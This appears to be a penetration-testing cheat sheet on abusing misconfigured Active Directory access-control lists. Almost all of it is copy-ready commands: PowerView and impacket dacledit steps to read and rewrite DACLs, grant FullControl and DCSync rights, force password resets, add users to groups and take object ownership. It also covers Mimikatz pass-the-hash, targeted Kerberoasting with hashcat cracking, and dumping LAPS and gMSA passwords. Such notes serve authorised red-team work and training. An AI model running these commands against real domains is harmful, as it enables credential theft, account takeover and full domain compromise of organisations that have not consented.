## DACL Abuse Overview

Discretionary Access Control Lists (DACLs) define who has what rights over AD objects. Misconfigured DACLs allow attackers to reset passwords, add users to groups, read LAPS/gMSA passwords, and grant DCSync rights.

---

## Abusing DACLs from Windows

### Convert Username to SID

```powershell
$userSID = ConvertTo-SID <username>
```

### Get All ACEs for a Target Where Rights Belong to a User

```powershell
Get-DomainObjectAcl -ResolveGUIDs -Identity <target-object> | ?{$_.SecurityIdentifier -eq $userSID}
```

### Password Reset via ForceChangePassword

If you have `ForceChangePassword` or `GenericAll` over a user account, reset their password directly.

```powershell
Set-DomainUserPassword -Identity <target-username> -AccountPassword $((ConvertTo-SecureString '<new-password>' -AsPlainText -Force)) -Verbose
```

### Read LAPS Password via GenericAll/ReadLAPSPassword

If you have `ReadLAPSPassword` or `GenericAll` over a computer object, read the local admin password.

```powershell
Get-DomainObject -Identity <computer-name> -Properties "ms-mcs-AdmPwd",name
```

### Overpass-the-Hash with Mimikatz

Use an NT hash to perform OtH and spawn a process in that user's security context.

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell.exe" exit
```

---

## Abusing DACLs from Linux

### View DACLs for a Target (dacledit)

Lists all ACEs for a target where the specified principal holds rights.

```bash
python3 examples/dacledit.py -principal <username> -target <target-user> -dc-ip <dc-ip> <domain>/<username>:<password>
```

### Grant FullControl Over an Account

```bash
python3 examples/dacledit.py -principal <username> -target <target-user> -dc-ip <dc-ip> <domain>/<username>:<password> -action write
```

### Grant DCSync Rights via DACL

Adds Replication-Get-Changes and Replication-Get-Changes-All rights to the domain object.

```bash
python3 examples/dacledit.py -principal <username> -target-dn dc=<domain>,dc=local -dc-ip <dc-ip> <domain>/<username>:<password> -action write -rights DCSync
```

### Targeted Kerberoasting

If you have `GenericAll` or `WriteProperty` over a user, set an SPN on them and kerberoast their hash.

```bash
python3 targetedKerberoast.py -vv -d <domain> -u <username> -p <password> --request-user <target-user> --dc-ip <dc-ip> -o target.txt
hashcat -m 13100 target.txt /usr/share/wordlists/rockyou.txt --force
```

### Query Group Membership

```bash
net rpc group members '<Group Name>' -U <domain>/<username>%<password> -S <dc-ip>
```

### Add User to Group

```bash
net rpc group addmem '<Group Name>' <target-username> -U <domain>/<username>%<password> -S <dc-ip>
```

### Password Reset via RPC

```bash
net rpc password <target-username> <new-password> -U <domain>/<username>%<password> -S <dc-ip>
```

### Read All LAPS Passwords (laps.py)

```bash
python3 laps.py -u <username> -p <password> -l <dc-ip> -d <domain>
```

### Read gMSA Password (gMSADumper)

```bash
python3 gMSADumper.py -d <domain> -l <dc-ip> -u <username> -p <password>
```

### Change Object Owner

If you have `WriteOwner` over an object, change ownership to yourself first, then modify the DACL.

```bash
python3 examples/owneredit.py -new-owner <username> -target <target-user> -dc-ip <dc-ip> <domain>/<username>:<password> -action write
```
